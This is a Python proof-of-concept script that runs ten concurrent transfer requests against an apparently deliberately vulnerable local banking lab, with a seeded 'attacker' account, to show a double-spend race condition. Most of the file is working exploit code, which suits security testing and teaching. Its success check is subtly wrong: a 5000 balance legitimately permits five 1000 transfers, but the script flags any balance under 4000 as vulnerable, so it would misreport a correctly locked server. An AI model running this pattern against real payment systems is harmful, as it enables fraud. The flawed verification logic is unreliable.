"""
Standalone reproduction script for the fund_transfer_flaws double-spend
race condition. This targets a TIMING bug, so it's run manually against
the live Docker deployment rather than as an automated pytest -- race
conditions are inherently flaky under a single-process test client and
need real concurrent connections (and ideally Postgres, not SQLite) to
reproduce reliably.

Usage:
    pip install requests
    python race_poc.py

Expects the app running on http://localhost:9090 with the seeded
`attacker` account (balance starts at 5000.00) and beneficiary id 101
(seeded by idor_beneficiary's module).
"""
import threading
import requests

BASE_URL = "http://localhost:9090"
CONCURRENT_REQUESTS = 10
TRANSFER_AMOUNT = 1000  # 10 x 1000 = 10000, more than the 5000 starting balance


def do_transfer(session, results, index):
    resp = session.post(f"{BASE_URL}/transfer", json={
        "beneficiary_id": 101,
        "amount": TRANSFER_AMOUNT,
    })
    results[index] = resp.status_code, resp.json() if resp.ok else resp.text


def main():
    session = requests.Session()
    login_resp = session.post(f"{BASE_URL}/login", data={
        "username": "attacker", "password": "Password123!",
    })
    print("login status:", login_resp.status_code)

    balance_before = session.get(f"{BASE_URL}/account/balance").json()
    print("balance before:", balance_before)

    results = [None] * CONCURRENT_REQUESTS
    threads = [
        threading.Thread(target=do_transfer, args=(session, results, i))
        for i in range(CONCURRENT_REQUESTS)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    successes = sum(1 for status, _ in results if status == 200)
    print(f"\n{successes}/{CONCURRENT_REQUESTS} transfers succeeded")

    balance_after = session.get(f"{BASE_URL}/account/balance").json()
    print("balance after:", balance_after)

    expected_min_balance = 5000 - TRANSFER_AMOUNT  # if only 1 transfer should have gone through
    actual = float(balance_after["balance"])
    if actual < expected_min_balance:
        print(f"\n[VULNERABLE] Balance ({actual}) went below what a single "
              f"successful transfer should allow ({expected_min_balance}) -- "
              f"more transfers succeeded than the balance should have permitted.")
    else:
        print("\n[NOT REPRODUCED THIS RUN] Try increasing CONCURRENT_REQUESTS "
              "or running again -- race conditions are timing-dependent.")


if __name__ == "__main__":
    main()
